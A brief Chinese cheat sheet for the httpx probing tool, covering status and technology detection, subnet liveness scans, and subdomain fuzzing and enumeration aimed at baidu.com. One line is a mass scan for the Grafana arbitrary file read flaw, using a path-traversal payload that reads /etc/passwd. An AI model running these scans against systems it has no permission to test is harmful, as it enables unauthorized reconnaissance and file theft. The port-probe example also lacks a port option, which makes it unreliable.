#### httpx的基本使用

```
安装完go 环境后
基本探测
echo "www.baidu.com" | httpx -title -status-code -tech-detect
指定端口探测
echo "www.baidu.com" | httpx -title -status-code -tech-detect
c端存活探测
echo 127.0.0/24 | httpx -silent
Grafana任意文件读取快速扫描
httpx -l ip.txt -status-code -path "public/plugins/prometheus/../../../../../../../etc/passwd" -mc 200 -mr "root:x"

FUZZ子域名
wget -q -O - "https://raw.githubusercontent.com/weujieytt/SrcCommon/main/FUZZ/subnames.txt" | sed 's/FUZZ/baidu.com/g' | httpx -sc -title -location -t 100

subfinder枚举域名并使用httpx存活探测
subfinder -d baidu.com -silent | httpx -sc -title

```

